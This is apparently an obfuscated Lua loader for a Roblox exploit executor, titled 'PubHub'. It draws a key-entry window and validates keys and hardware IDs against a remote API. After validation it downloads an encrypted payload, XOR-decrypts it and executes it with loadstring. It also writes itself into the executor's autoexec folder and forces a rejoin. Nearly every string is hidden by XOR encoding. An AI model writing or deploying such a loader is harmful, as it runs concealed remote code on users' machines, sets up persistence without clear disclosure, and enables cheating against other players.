KeyGui.Name = (function()local w2B18I=unpack or table.unpack;local vV0kl4E={59,30,9,35,30,9,52,32,14,18,52};for i=1,#vV0kl4E do vV0kl4E[i]=bit32.bxor(vV0kl4E[i],107) end;return string.char(w2B18I(vV0kl4E))end)() .. HttpService:GenerateGUID(false):sub(1, 8)
KeyGui.ResetOnSpawn = false
KeyGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
KeyGui.DisplayOrder = 998
KeyGui.Parent = gethui()
local Blur = Instance.new((function()local jg7O=unpack or table.unpack;local qDgx09Dylz={45,25,10,6,14};for i=1,#qDgx09Dylz do qDgx09Dylz[i]=bit32.bxor(qDgx09Dylz[i],107) end;return string.char(jg7O(qDgx09Dylz))end)())
Blur.Size = UDim2.fromScale(1, 1)
Blur.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Blur.BackgroundTransparency = 1
Blur.BorderSizePixel = 0
Blur.Parent = KeyGui
local KeyFrame = Instance.new((function()local ur8TAs=unpack or table.unpack;local Ln8qEK8Czi={45,25,10,6,14};for i=1,#Ln8qEK8Czi do Ln8qEK8Czi[i]=bit32.bxor(Ln8qEK8Czi[i],107) end;return string.char(ur8TAs(Ln8qEK8Czi))end)())
KeyFrame.Size = UDim2.fromOffset(420, 560)
KeyFrame.Position = UDim2.fromScale(0.5, 0.5)
KeyFrame.AnchorPoint = Vector2.new(0.5, 0.5)
KeyFrame.BackgroundColor3 = Color3.fromRGB(13, 15, 26)
KeyFrame.BorderSizePixel = 0
KeyFrame.ClipsDescendants = true
KeyFrame.Parent = KeyGui
local KeyCorner = Instance.new((function()local rr3b=unpack or table.unpack;local CT4B7z={62,34,40,4,25,5,14,25};for i=1,#CT4B7z do CT4B7z[i]=bit32.bxor(CT4B7z[i],107) end;return string.char(rr3b(CT4B7z))end)())
KeyCorner.CornerRadius = UDim.new(0, 20)
KeyCorner.Parent = KeyFrame
local KeyStroke = Instance.new((function()local hT4rt6=unpack or table.unpack;local UtTensdtB={62,34,56,31,25,4,0,14};for i=1,#UtTensdtB do UtTensdtB[i]=bit32.bxor(UtTensdtB[i],107) end;return string.char(hT4rt6(UtTensdtB))end)())
KeyStroke.Color = Color3.fromRGB(139, 92, 246)
KeyStroke.Thickness = 2
KeyStroke.Parent = KeyFrame
local KeyGradient = Instance.new((function()local Ee_rx=unpack or table.unpack;local iFoLK7cS={62,34,44,25,10,15,2,14,5,31};for i=1,#iFoLK7cS do iFoLK7cS[i]=bit32.bxor(iFoLK7cS[i],107) end;return string.char(Ee_rx(iFoLK7cS))end)())
KeyGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 18, 40)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 12, 20)),
})
KeyGradient.Rotation = 60
KeyGradient.Parent = KeyFrame
local Title = Instance.new((function()local baNsG=unpack or table.unpack;local rdinAe={63,14,19,31,39,10,9,14,7};for i=1,#rdinAe do rdinAe[i]=bit32.bxor(rdinAe[i],107) end;return string.char(baNsG(rdinAe))end)())
Title.Size = UDim2.new(1, -40, 0, 40)
Title.Position = UDim2.fromOffset(20, 16)
Title.BackgroundTransparency = 1
Title.Font = Enum.Font.GothamBold
Title.TextSize = 24
Title.Text = (function()local taup=unpack or table.unpack;local _YLh7pxloX={59,30,9,35,30,9};for i=1,#_YLh7pxloX do _YLh7pxloX[i]=bit32.bxor(_YLh7pxloX[i],107) end;return string.char(taup(_YLh7pxloX))end)()
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = KeyFrame
local TitleGrad = Instance.new((function()local e7v8t=unpack or table.unpack;local rcQFI087={62,34,44,25,10,15,2,14,5,31};for i=1,#rcQFI087 do rcQFI087[i]=bit32.bxor(rcQFI087[i],107) end;return string.char(e7v8t(rcQFI087))end)())
TitleGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(139, 92, 246)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(236, 72, 153)),
})
TitleGrad.Parent = Title
local Sub = Instance.new((function()local s91uU=unpack or table.unpack;local BJ3Jisy={63,14,19,31,39,10,9,14,7};for i=1,#BJ3Jisy do BJ3Jisy[i]=bit32.bxor(BJ3Jisy[i],107) end;return string.char(s91uU(BJ3Jisy))end)())
Sub.Size = UDim2.new(1, -40, 0, 16)
Sub.Position = UDim2.fromOffset(20, 56)
Sub.BackgroundTransparency = 1
Sub.Font = Enum.Font.Gotham
Sub.TextSize = 12
Sub.Text = (function()local WcPjh=unpack or table.unpack;local Om57bQ={46,5,31,14,25,75,18,4,30,25,75,0,14,18,75,31,4,75,8,4,5,31,2,5,30,14};for i=1,#Om57bQ do Om57bQ[i]=bit32.bxor(Om57bQ[i],107) end;return string.char(WcPjh(Om57bQ))end)()
Sub.TextColor3 = Color3.fromRGB(156, 163, 175)
Sub.TextXAlignment = Enum.TextXAlignment.Left
Sub.Parent = KeyFrame
local InputBg = Instance.new((function()local wWRPR=unpack or table.unpack;local _mfHsyC79a={45,25,10,6,14};for i=1,#_mfHsyC79a do _mfHsyC79a[i]=bit32.bxor(_mfHsyC79a[i],107) end;return string.char(wWRPR(_mfHsyC79a))end)())
InputBg.Size = UDim2.new(1, -40, 0, 44)
InputBg.Position = UDim2.fromOffset(20, 90)
InputBg.BackgroundColor3 = Color3.fromRGB(22, 24, 38)
InputBg.BorderSizePixel = 0
InputBg.Parent = KeyFrame
local InputCorner = Instance.new((function()local lUIp=unpack or table.unpack;local xdGUdf6H={62,34,40,4,25,5,14,25};for i=1,#xdGUdf6H do xdGUdf6H[i]=bit32.bxor(xdGUdf6H[i],107) end;return string.char(lUIp(xdGUdf6H))end)())
InputCorner.CornerRadius = UDim.new(0, 10)
InputCorner.Parent = InputBg
local InputStroke = Instance.new((function()local Jd_mFP=unpack or table.unpack;local MpPa0UmhMA={62,34,56,31,25,4,0,14};for i=1,#MpPa0UmhMA do MpPa0UmhMA[i]=bit32.bxor(MpPa0UmhMA[i],107) end;return string.char(Jd_mFP(MpPa0UmhMA))end)())
InputStroke.Color = Color3.fromRGB(45, 48, 72)
InputStroke.Thickness = 1
InputStroke.Parent = InputBg
local KeyInput = Instance.new((function()local IvbL=unpack or table.unpack;local sy5vE7M2H={63,14,19,31,41,4,19};for i=1,#sy5vE7M2H do sy5vE7M2H[i]=bit32.bxor(sy5vE7M2H[i],107) end;return string.char(IvbL(sy5vE7M2H))end)())
KeyInput.Size = UDim2.new(1, -20, 1, 0)
KeyInput.Position = UDim2.fromOffset(10, 0)
KeyInput.BackgroundTransparency = 1
KeyInput.Font = Enum.Font.Code
KeyInput.TextSize = 14
KeyInput.Text = ""
KeyInput.PlaceholderText = (function()local gP16Ko=unpack or table.unpack;local eTVCM_={59,62,41,70,51,51,51,51,70,51,51,51,51,70,51,51,51,51,70,51,51,51,51};for i=1,#eTVCM_ do eTVCM_[i]=bit32.bxor(eTVCM_[i],107) end;return string.char(gP16Ko(eTVCM_))end)()
KeyInput.PlaceholderColor3 = Color3.fromRGB(80, 85, 110)
KeyInput.TextColor3 = Color3.fromRGB(226, 232, 240)
KeyInput.TextXAlignment = Enum.TextXAlignment.Left
KeyInput.ClearTextOnFocus = false
KeyInput.Parent = InputBg
KeyInput.Focused:Connect(function()
    TweenService:Create(InputStroke, TweenInfo.new(0.2), {Color = Color3.fromRGB(139, 92, 246)}):Play()
end)
KeyInput.FocusLost:Connect(function()
    TweenService:Create(InputStroke, TweenInfo.new(0.2), {Color = Color3.fromRGB(45, 48, 72)}):Play()
end)
local ButtonsY = 150
local function MakeButton(text, y, primary, onClick)
    local Btn = Instance.new((function()local TBCW=unpack or table.unpack;local F4to3v6={63,14,19,31,41,30,31,31,4,5};for i=1,#F4to3v6 do F4to3v6[i]=bit32.bxor(F4to3v6[i],107) end;return string.char(TBCW(F4to3v6))end)())
    Btn.Size = UDim2.new(1, -40, 0, 42)
    Btn.Position = UDim2.fromOffset(20, y)
    Btn.Font = Enum.Font.GothamBold
    Btn.TextSize = 14
    Btn.Text = text
    Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    Btn.BorderSizePixel = 0
    Btn.AutoButtonColor = false
    Btn.Parent = KeyFrame
    if primary then
        Btn.BackgroundColor3 = Color3.fromRGB(139, 92, 246)
    else
        Btn.BackgroundColor3 = Color3.fromRGB(28, 30, 46)
    end
    local BC = Instance.new((function()local UAeShr=unpack or table.unpack;local nfP9iqDJ={62,34,40,4,25,5,14,25};for i=1,#nfP9iqDJ do nfP9iqDJ[i]=bit32.bxor(nfP9iqDJ[i],107) end;return string.char(UAeShr(nfP9iqDJ))end)())
    BC.CornerRadius = UDim.new(0, 10)
    BC.Parent = Btn
    local BS = Instance.new((function()local BwIT=unpack or table.unpack;local tgfE8JU8w={62,34,56,31,25,4,0,14};for i=1,#tgfE8JU8w do tgfE8JU8w[i]=bit32.bxor(tgfE8JU8w[i],107) end;return string.char(BwIT(tgfE8JU8w))end)())
    BS.Color = primary and Color3.fromRGB(139, 92, 246) or Color3.fromRGB(45, 48, 72)
    BS.Thickness = 1
    BS.Transparency = primary and 0 or 0.5
    BS.Parent = Btn
    if primary then
        local BG = Instance.new((function()local bul8zU=unpack or table.unpack;local aeoiy5S={62,34,44,25,10,15,2,14,5,31};for i=1,#aeoiy5S do aeoiy5S[i]=bit32.bxor(aeoiy5S[i],107) end;return string.char(bul8zU(aeoiy5S))end)())
        BG.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(139, 92, 246)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(109, 62, 216)),
        })
        BG.Rotation = 90
        BG.Parent = Btn
    end
    Btn.MouseEnter:Connect(function()
        TweenService:Create(Btn, TweenInfo.new(0.15), {
            BackgroundColor3 = primary and Color3.fromRGB(159, 112, 255) or Color3.fromRGB(38, 40, 60)
        }):Play()
    end)
    Btn.MouseLeave:Connect(function()
        TweenService:Create(Btn, TweenInfo.new(0.15), {
            BackgroundColor3 = primary and Color3.fromRGB(139, 92, 246) or Color3.fromRGB(28, 30, 46)
        }):Play()
    end)
    Btn.MouseButton1Click:Connect(function()
        TweenService:Create(Btn, TweenInfo.new(0.08), {Size = UDim2.new(1, -44, 0, 40)}):Play()
        task.wait(0.08)
        TweenService:Create(Btn, TweenInfo.new(0.12, Enum.EasingStyle.Back), {Size = UDim2.new(1, -40, 0, 42)}):Play()
        pcall(onClick)
    end)
    return Btn
end
local StatusLbl = Instance.new((function()local mOqY_=unpack or table.unpack;local jmGzeaV6Qe={63,14,19,31,39,10,9,14,7};for i=1,#jmGzeaV6Qe do jmGzeaV6Qe[i]=bit32.bxor(jmGzeaV6Qe[i],107) end;return string.char(mOqY_(jmGzeaV6Qe))end)())
StatusLbl.Size = UDim2.new(1, -40, 0, 18)
StatusLbl.Position = UDim2.fromOffset(20, 530)
StatusLbl.BackgroundTransparency = 1
StatusLbl.Font = Enum.Font.Gotham
StatusLbl.TextSize = 12
StatusLbl.Text = ""
StatusLbl.TextColor3 = Color3.fromRGB(248, 113, 113)
StatusLbl.TextXAlignment = Enum.TextXAlignment.Left
StatusLbl.Parent = KeyFrame
local function setStatus(msg, ok)
    StatusLbl.Text = msg
    StatusLbl.TextColor3 = ok and Color3.fromRGB(52, 211, 153) or Color3.fromRGB(248, 113, 113)
end
local CloseBtn = Instance.new((function()local vidb=unpack or table.unpack;local Mdx8Sdbhj={63,14,19,31,41,30,31,31,4,5};for i=1,#Mdx8Sdbhj do Mdx8Sdbhj[i]=bit32.bxor(Mdx8Sdbhj[i],107) end;return string.char(vidb(Mdx8Sdbhj))end)())
CloseBtn.Size = UDim2.fromOffset(32, 32)
CloseBtn.Position = UDim2.new(1, -44, 0, 12)
CloseBtn.BackgroundColor3 = Color3.fromRGB(28, 30, 46)
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.TextSize = 16
CloseBtn.Text = "×"
CloseBtn.TextColor3 = Color3.fromRGB(156, 163, 175)
CloseBtn.BorderSizePixel = 0
CloseBtn.Parent = KeyFrame
local CCC = Instance.new((function()local SKITiY=unpack or table.unpack;local OFe9vpo8J={62,34,40,4,25,5,14,25};for i=1,#OFe9vpo8J do OFe9vpo8J[i]=bit32.bxor(OFe9vpo8J[i],107) end;return string.char(SKITiY(OFe9vpo8J))end)())
CCC.CornerRadius = UDim.new(0, 8)
CCC.Parent = CloseBtn
CloseBtn.MouseButton1Click:Connect(function()
    TweenService:Create(KeyFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
        Size = UDim2.fromOffset(0, 0),
        BackgroundTransparency = 1
    }):Play()
    task.wait(0.3)
    KeyGui:Destroy()
end)
local VALIDATED = false
local KEY_DATA = nil
local function validateKey(key, silent)
    if not silent then setStatus((function()local dlrTU=unpack or table.unpack;local d4Vcos9vxr={40,3,14,8,0,2,5,12,75,0,14,18,69,69,69};for i=1,#d4Vcos9vxr do d4Vcos9vxr[i]=bit32.bxor(d4Vcos9vxr[i],107) end;return string.char(dlrTU(d4Vcos9vxr))end)(), true) end
    local url = string.format((function()local G1_O=unpack or table.unpack;local bBPoMEhYK={78,24,68,8,3,14,8,0,84,0,14,18,86,78,24,77,3,28,86,78,24};for i=1,#bBPoMEhYK do bBPoMEhYK[i]=bit32.bxor(bBPoMEhYK[i],107) end;return string.char(G1_O(bBPoMEhYK))end)(), PUBHUB_API,
        HttpService:UrlEncode(key), HttpService:UrlEncode(HWID))
    local body = httpget(url)
    local data = safejson(body)
    if not data then
        if not silent then setStatus((function()local zbeSZQ=unpack or table.unpack;local yDthfhXH={40,4,5,5,14,8,31,2,4,5,75,13,10,2,7,14,15};for i=1,#yDthfhXH do yDthfhXH[i]=bit32.bxor(yDthfhXH[i],107) end;return string.char(zbeSZQ(yDthfhXH))end)(), false) end
        return false
    end
    if data.valid then
        VALIDATED = true
        KEY_DATA = data
        saveKey(key)
        pcall(function()
            (getgenv and getgenv() or _G).__PUBHUB_KEY = { ExpiresAt = data.expires_at, Hours = data.hours }
        end)
        if not silent then
            setStatus((function()local CG0tEn=unpack or table.unpack;local SiztYxUiHk={56,30,8,8,14,24,24,74};for i=1,#SiztYxUiHk do SiztYxUiHk[i]=bit32.bxor(SiztYxUiHk[i],107) end;return string.char(CG0tEn(SiztYxUiHk))end)(), true)
            Notify((function()local QQPz=unpack or table.unpack;local IuPVmzkLi={56,30,8,8,14,24,24,74,75,32,14,18,75,29,10,7,2,15,75,137,235,255,75};for i=1,#IuPVmzkLi do IuPVmzkLi[i]=bit32.bxor(IuPVmzkLi[i],107) end;return string.char(QQPz(IuPVmzkLi))end)() .. math.floor((data.remaining or 0) / 3600) .. (function()local o7j0s=unpack or table.unpack;local rRMvklD7eP={3,75,7,14,13,31};for i=1,#rRMvklD7eP do rRMvklD7eP[i]=bit32.bxor(rRMvklD7eP[i],107) end;return string.char(o7j0s(rRMvklD7eP))end)(), true)
        end
        return true
    else
        if not silent then
            setStatus((function()local EilhLW=unpack or table.unpack;local oiW1EIfGT={187,249,186,224,75,187,217,187,217,187,222,187,208,187,211,75,187,214,187,222,187,217,187,222,186,235,187,214,186,224,187,210,75,187,209,187,208,186,229,186,236};for i=1,#oiW1EIfGT do oiW1EIfGT[i]=bit32.bxor(oiW1EIfGT[i],107) end;return string.char(EilhLW(oiW1EIfGT))end)(), false)
            Notify((function()local Oenz=unpack or table.unpack;local O6cS_x={187,249,186,224,75,187,217,187,217,187,222,187,208,187,211,75,187,214,187,222,187,217,187,222,186,235,187,214,186,224,187,210,75,187,209,187,208,186,229,186,236};for i=1,#O6cS_x do O6cS_x[i]=bit32.bxor(O6cS_x[i],107) end;return string.char(Oenz(O6cS_x))end)(), false)
        end
        return false
    end
end
local function getLootlabsLink(checkpoints, provider)
    provider = provider or (function()local V1aT=unpack or table.unpack;local d7qzsXy={7,4,4,31,7,10,9,24};for i=1,#d7qzsXy do d7qzsXy[i]=bit32.bxor(d7qzsXy[i],107) end;return string.char(V1aT(d7qzsXy))end)()
    setStatus(string.format((function()local xMAjp=unpack or table.unpack;local sBxUhU3={44,14,5,14,25,10,31,2,5,12,75,78,24,75,7,2,5,0,75,67,78,15,75,8,3,14,8,0,27,4,2,5,31,24,66,69,69,69};for i=1,#sBxUhU3 do sBxUhU3[i]=bit32.bxor(sBxUhU3[i],107) end;return string.char(xMAjp(sBxUhU3))end)(), provider, checkpoints), true)
    local endpoint = provider == (function()local gk5jW=unpack or table.unpack;local ya2W50oWvV={28,4,25,0,2,5,0};for i=1,#ya2W50oWvV do ya2W50oWvV[i]=bit32.bxor(ya2W50oWvV[i],107) end;return string.char(gk5jW(ya2W50oWvV))end)() and "/getlink_workink" or "/getlink"
    local url = string.format((function()local kJM641=unpack or table.unpack;local fqnytMEw={78,24,78,24,84,3,28,86,78,24,77,8,86,78,15};for i=1,#fqnytMEw do fqnytMEw[i]=bit32.bxor(fqnytMEw[i],107) end;return string.char(kJM641(fqnytMEw))end)(), PUBHUB_API, endpoint,
        HttpService:UrlEncode(HWID), checkpoints)
    local body = httpget(url)
    local data = safejson(body)
    if not data then
        setStatus((function()local ZBfpLG=unpack or table.unpack;local gS_E6CCEGh={40,4,5,5,14,8,31,2,4,5,75,13,10,2,7,14,15};for i=1,#gS_E6CCEGh do gS_E6CCEGh[i]=bit32.bxor(gS_E6CCEGh[i],107) end;return string.char(ZBfpLG(gS_E6CCEGh))end)(), false)
        return nil
    end
    if data.url then
        local copied = pcall(function()
            if setclipboard then setclipboard(data.url)
            elseif toclipboard then toclipboard(data.url) end
        end)
        if copied then
            setStatus(string.format((function()local sW_j22=unpack or table.unpack;local l6jzORmhX={39,2,5,0,75,8,4,27,2,14,15,74,75,78,15,75,8,3,14,8,0,27,4,2,5,31,24,75,86,75,78,15,75,3,4,30,25,24};for i=1,#l6jzORmhX do l6jzORmhX[i]=bit32.bxor(l6jzORmhX[i],107) end;return string.char(sW_j22(l6jzORmhX))end)(), checkpoints, data.hours or 0), true)
            Notify((function()local o2ncz=unpack or table.unpack;local xQOXCls={187,202,186,234,186,224,187,208,187,209,187,219,75,186,234,187,209,187,213,187,212,187,211,186,235,187,213,187,217,187,219,187,214,187,219};for i=1,#xQOXCls do xQOXCls[i]=bit32.bxor(xQOXCls[i],107) end;return string.char(o2ncz(xQOXCls))end)(), true)
        else
            setStatus((function()local JXww=unpack or table.unpack;local fjJ4knhgh={39,2,5,0,81,75};for i=1,#fjJ4knhgh do fjJ4knhgh[i]=bit32.bxor(fjJ4knhgh[i],107) end;return string.char(JXww(fjJ4knhgh))end)() .. data.url, true)
            Notify((function()local Gdnw0=unpack or table.unpack;local xmTuYhY2JI={187,202,186,234,186,224,187,208,187,209,187,219,75,187,217,75,187,212,187,213,187,208,187,222,75,187,217,187,217,187,213,187,223,187,219,75,137,235,255,75,186,234,187,209,187,213,187,212,187,211,186,235,186,232,187,210,186,233,187,222,75,187,217,186,235,186,232,186,236,187,214,186,232,186,229};for i=1,#xmTuYhY2JI do xmTuYhY2JI[i]=bit32.bxor(xmTuYhY2JI[i],107) end;return string.char(Gdnw0(xmTuYhY2JI))end)(), false)
        end
        pcall(function() KeyInput.Text = data.url end)
        return data.url
    else
        setStatus(data.error or (function()local j3bJV=unpack or table.unpack;local gF18s1i={45,10,2,7,14,15,75,31,4,75,12,14,5,14,25,10,31,14,75,7,2,5,0};for i=1,#gF18s1i do gF18s1i[i]=bit32.bxor(gF18s1i[i],107) end;return string.char(j3bJV(gF18s1i))end)(), false)
        Notify(data.error or (function()local YFaffC=unpack or table.unpack;local CurvhH9nBu={45,10,2,7,14,15,75,31,4,75,12,14,5,14,25,10,31,14,75,7,2,5,0};for i=1,#CurvhH9nBu do CurvhH9nBu[i]=bit32.bxor(CurvhH9nBu[i],107) end;return string.char(YFaffC(CurvhH9nBu))end)(), false)
        return nil
    end
end
local function proceedToMain()
    print((function()local crBBHC=unpack or table.unpack;local OW5hqcx_IW={48,59,30,9,35,30,9,54,75,27,25,4,8,14,14,15,63,4,38,10,2,5,75,24,31,10,25,31};for i=1,#OW5hqcx_IW do OW5hqcx_IW[i]=bit32.bxor(OW5hqcx_IW[i],107) end;return string.char(crBBHC(OW5hqcx_IW))end)())
    TweenService:Create(KeyFrame, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {
        Size = UDim2.fromOffset(0, 0),
        BackgroundTransparency = 1
    }):Play()
    task.wait(0.4)
    pcall(function() KeyGui:Destroy() end)
    pcall(function() SplashGui:Destroy() end)
    print((function()local q3wGb=unpack or table.unpack;local t3aggC={48,59,30,9,35,30,9,54,75,13,14,31,8,3,2,5,12,75,6,10,2,5,75,27,10,18,7,4,10,15,69,69,69};for i=1,#t3aggC do t3aggC[i]=bit32.bxor(t3aggC[i],107) end;return string.char(q3wGb(t3aggC))end)())
    local payloadUrl = string.format((function()local VjbS=unpack or table.unpack;local CZ2gtC={78,24,84,0,14,18,86,78,24,77,3,28,86,78,24};for i=1,#CZ2gtC do CZ2gtC[i]=bit32.bxor(CZ2gtC[i],107) end;return string.char(VjbS(CZ2gtC))end)(), MAIN_PAYLOAD_URL,
        HttpService:UrlEncode(KeyInput.Text), HttpService:UrlEncode(HWID))
    local body = httpget(payloadUrl)
    if not body then
        warn((function()local u_EzBx=unpack or table.unpack;local Yc79jXU_={48,59,30,9,35,30,9,54,75,45,10,2,7,14,15,75,31,4,75,13,14,31,8,3,75,27,10,18,7,4,10,15};for i=1,#Yc79jXU_ do Yc79jXU_[i]=bit32.bxor(Yc79jXU_[i],107) end;return string.char(u_EzBx(Yc79jXU_))end)())
        Notify((function()local Rh0I=unpack or table.unpack;local otY6_gmp={187,245,186,227,187,211,187,218,187,209,187,219,75,187,220,187,219,187,216,186,235,186,232,187,220,187,209,187,211};for i=1,#otY6_gmp do otY6_gmp[i]=bit32.bxor(otY6_gmp[i],107) end;return string.char(Rh0I(otY6_gmp))end)(), false)
        return
    end
    local data2 = safejson(body)
    if not data2 or not data2.data or not data2.k then
        warn((function()local wwTtm=unpack or table.unpack;local QpnlPC={48,59,30,9,35,30,9,54,75,41,10,15,75,27,10,18,7,4,10,15,75,25,14,24,27,4,5,24,14};for i=1,#QpnlPC do QpnlPC[i]=bit32.bxor(QpnlPC[i],107) end;return string.char(wwTtm(QpnlPC))end)())
        Notify((function()local LcZ4jx=unpack or table.unpack;local n__l_E={187,245,186,227,187,211,187,218,187,209,187,219,75,187,220,187,219,187,216,186,235,186,232,187,220,187,209,187,211};for i=1,#n__l_E do n__l_E[i]=bit32.bxor(n__l_E[i],107) end;return string.char(LcZ4jx(n__l_E))end)(), false)
        return
    end
    print((function()local OdV1n=unpack or table.unpack;local XDAaly={48,59,30,9,35,30,9,54,75,27,10,18,7,4,10,15,75,14,5,8,25,18,27,31,14,15,71,75,15,14,8,25,18,27,31,2,5,12,69,69,69};for i=1,#XDAaly do XDAaly[i]=bit32.bxor(XDAaly[i],107) end;return string.char(OdV1n(XDAaly))end)())
    local src = xorDecrypt(data2.data, data2.k)
    print((function()local RU9K9I=unpack or table.unpack;local mh5u1n80A={48,59,30,9,35,30,9,54,75,27,10,18,7,4,10,15,75,24,2,17,14,81};for i=1,#mh5u1n80A do mh5u1n80A[i]=bit32.bxor(mh5u1n80A[i],107) end;return string.char(RU9K9I(mh5u1n80A))end)(), #src)
    local coreSize = data2.core_size or 0
    local coreSrc = src:sub(1, coreSize)
    local mainSrc = src:sub(coreSize + 2)
    print((function()local uDAM0h=unpack or table.unpack;local BbOCOH94Am={48,59,30,9,35,30,9,54,75,8,4,25,14,81};for i=1,#BbOCOH94Am do BbOCOH94Am[i]=bit32.bxor(BbOCOH94Am[i],107) end;return string.char(uDAM0h(BbOCOH94Am))end)(), #coreSrc, (function()local et6w=unpack or table.unpack;local objm4u={6,10,2,5,81};for i=1,#objm4u do objm4u[i]=bit32.bxor(objm4u[i],107) end;return string.char(et6w(objm4u))end)(), #mainSrc)
    local coreFn, coreErr = loadstring(coreSrc)
    if coreFn then pcall(coreFn) else warn((function()local LKXkp=unpack or table.unpack;local cofdRc9X={48,59,30,9,35,30,9,54,75,40,4,25,14,75,14,25,25,4,25,81,75};for i=1,#cofdRc9X do cofdRc9X[i]=bit32.bxor(cofdRc9X[i],107) end;return string.char(LKXkp(cofdRc9X))end)() .. tostring(coreErr)) end
    local fn, err = loadstring(mainSrc)
    if not fn then
        warn((function()local m3q97z=unpack or table.unpack;local meZH1KjI={48,59,30,9,35,30,9,54,75,59,10,18,7,4,10,15,75,7,4,10,15,24,31,25,2,5,12,75,14,25,25,4,25,81,75};for i=1,#meZH1KjI do meZH1KjI[i]=bit32.bxor(meZH1KjI[i],107) end;return string.char(m3q97z(meZH1KjI))end)() .. tostring(err))
        Notify((function()local PmHej=unpack or table.unpack;local a8A5JH={39,4,10,15,75,14,25,25,4,25,81,75};for i=1,#a8A5JH do a8A5JH[i]=bit32.bxor(a8A5JH[i],107) end;return string.char(PmHej(a8A5JH))end)() .. tostring(err):sub(1, 100), false)
        return
    end
    print((function()local ngkSqD=unpack or table.unpack;local lhNs49VtQm={48,59,30,9,35,30,9,54,75,7,4,10,15,24,31,25,2,5,12,75,36,32,71,75,14,19,14,8,30,31,2,5,12,69,69,69};for i=1,#lhNs49VtQm do lhNs49VtQm[i]=bit32.bxor(lhNs49VtQm[i],107) end;return string.char(ngkSqD(lhNs49VtQm))end)())
    Notify((function()local YXeZz=unpack or table.unpack;local w77EYRXT={59,30,9,35,30,9,75,187,220,187,219,187,212,186,232,186,234,187,209,187,219,187,222,186,233,186,234,186,228,69,69,69};for i=1,#w77EYRXT do w77EYRXT[i]=bit32.bxor(w77EYRXT[i],107) end;return string.char(YXeZz(w77EYRXT))end)(), true)
    local ok, runerr = pcall(fn)
    if not ok then
        warn((function()local vQxr=unpack or table.unpack;local RcPudz_t={48,59,30,9,35,30,9,54,75,59,10,18,7,4,10,15,75,25,30,5,31,2,6,14,75,14,25,25,4,25,81,75};for i=1,#RcPudz_t do RcPudz_t[i]=bit32.bxor(RcPudz_t[i],107) end;return string.char(vQxr(RcPudz_t))end)() .. tostring(runerr))
        Notify((function()local gIi8=unpack or table.unpack;local CLzW9by0u={57,30,5,31,2,6,14,81,75};for i=1,#CLzW9by0u do CLzW9by0u[i]=bit32.bxor(CLzW9by0u[i],107) end;return string.char(gIi8(CLzW9by0u))end)() .. tostring(runerr):sub(1, 100), false)
    else
        print((function()local J42ZY=unpack or table.unpack;local DeyfYqkw={48,59,30,9,35,30,9,54,75,59,10,18,7,4,10,15,75,14,19,14,8,30,31,14,15,75,24,30,8,8,14,24,24,13,30,7,7,18};for i=1,#DeyfYqkw do DeyfYqkw[i]=bit32.bxor(DeyfYqkw[i],107) end;return string.char(J42ZY(DeyfYqkw))end)())
    end
end
MakeButton((function()local yiFnhI=unpack or table.unpack;local zvQqaEo={61,10,7,2,15,10,31,14,75,32,14,18};for i=1,#zvQqaEo do zvQqaEo[i]=bit32.bxor(zvQqaEo[i],107) end;return string.char(yiFnhI(zvQqaEo))end)(), 150, true, function()
    local k = KeyInput.Text:gsub("%s+", ""):upper()
    if #k < 10 then
        setStatus((function()local _xoUf=unpack or table.unpack;local JU_GxWuyqf={32,14,18,75,31,4,4,75,24,3,4,25,31};for i=1,#JU_GxWuyqf do JU_GxWuyqf[i]=bit32.bxor(JU_GxWuyqf[i],107) end;return string.char(_xoUf(JU_GxWuyqf))end)(), false)
        return
    end
    if validateKey(k) then
        task.wait(0.5)
        Notify((function()local Pv2MLO=unpack or table.unpack;local Cfu2Hx={187,252,187,219,187,216,186,235,186,232,187,220,187,209,187,219,75,59,30,9,35,30,9,69,69,69};for i=1,#Cfu2Hx do Cfu2Hx[i]=bit32.bxor(Cfu2Hx[i],107) end;return string.char(Pv2MLO(Cfu2Hx))end)(), true)
        if not alreadyAutoexec() then
            local wrote = setupAutoexec()
            if wrote then
                Notify((function()local sLlnNh=unpack or table.unpack;local KqpBRN={42,30,31,4,70,14,19,14,8,75,186,232,186,234,186,233,187,219,187,214,187,213,187,217,187,208,187,222,187,214,75,137,235,255,75,187,212,187,222,186,235,187,222,187,220,187,219,186,238,187,213,187,223,187,211,187,215};for i=1,#KqpBRN do KqpBRN[i]=bit32.bxor(KqpBRN[i],107) end;return string.char(sLlnNh(KqpBRN))end)(), true)
                task.wait(1.5)
                rejoinPlace()
                return
            end
        end
        proceedToMain()
    end
end)
MakeButton((function()local GZKRZ=unpack or table.unpack;local STE9jwKo5={44,14,31,75,32,14,18,75,137,235,255,75,90,89,75,3,4,30,25,24,75,169,220,75,39,4,4,31,7,10,9,24};for i=1,#STE9jwKo5 do STE9jwKo5[i]=bit32.bxor(STE9jwKo5[i],107) end;return string.char(GZKRZ(STE9jwKo5))end)(), 200, false, function()
    getLootlabsLink(2, (function()local BP5fE=unpack or table.unpack;local MmXDSvjl={7,4,4,31,7,10,9,24};for i=1,#MmXDSvjl do MmXDSvjl[i]=bit32.bxor(MmXDSvjl[i],107) end;return string.char(BP5fE(MmXDSvjl))end)())
end)
MakeButton((function()local aG0w=unpack or table.unpack;local mSDqabRYOn={44,14,31,75,32,14,18,75,137,235,255,75,89,95,75,3,4,30,25,24,75,169,220,75,39,4,4,31,7,10,9,24};for i=1,#mSDqabRYOn do mSDqabRYOn[i]=bit32.bxor(mSDqabRYOn[i],107) end;return string.char(aG0w(mSDqabRYOn))end)(), 250, false, function()
    getLootlabsLink(3, (function()local J1T0=unpack or table.unpack;local pk4MC3EXjr={7,4,4,31,7,10,9,24};for i=1,#pk4MC3EXjr do pk4MC3EXjr[i]=bit32.bxor(pk4MC3EXjr[i],107) end;return string.char(J1T0(pk4MC3EXjr))end)())
end)
